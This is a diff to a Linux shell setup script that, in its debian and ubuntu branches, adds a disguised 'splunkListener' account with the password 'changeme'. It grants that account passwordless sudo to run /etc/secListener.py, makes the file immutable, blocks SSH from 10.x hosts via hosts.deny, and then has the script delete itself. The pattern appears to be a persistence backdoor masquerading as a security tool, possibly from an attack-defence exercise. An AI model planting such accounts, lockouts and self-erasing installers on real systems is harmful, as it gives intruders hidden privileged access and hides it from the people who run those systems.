@@ -64,7 +64,16 @@ fi
 if [ $machine=="debian" ]
 then
 apt-get update && apt-get install -y python3
-echo "kdsajf;ds"
+adduser splunkListener
+echo splunkListener:changeme | chpasswd
+echo "sshd: 10. \n" >> /etc/hosts.deny
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 1" >> /etc/sudoers
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 2" >> /etc/sudoers
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 3" >> /etc/sudoers
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 4" >> /etc/sudoers
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 999" >> /etc/sudoers
+chmod +x /etc/secListener.py
+chattr +i /etc/secListener.py
 fi
 if [ $machine=="fedora" ]
 then
@@ -130,6 +139,15 @@ fi
 if [ $machine=="ubuntu" ]
 then
 apt-get update && apt-get install -y python3
-echo "dswqgudhq"
+adduser splunkListener
+echo splunkListener:changeme | chpasswd
+echo "sshd: 10. \n" >> /etc/hosts.deny
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 1" >> /etc/sudoers
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 2" >> /etc/sudoers
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 3" >> /etc/sudoers
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 4" >> /etc/sudoers
+echo "splunkListener ALL = NOPASSWD: /bin/python3 /etc/secListener.py centos 999" >> /etc/sudoers
+chmod +x /etc/secListener.py
+chattr +i /etc/secListener.py
 fi
 rm $0
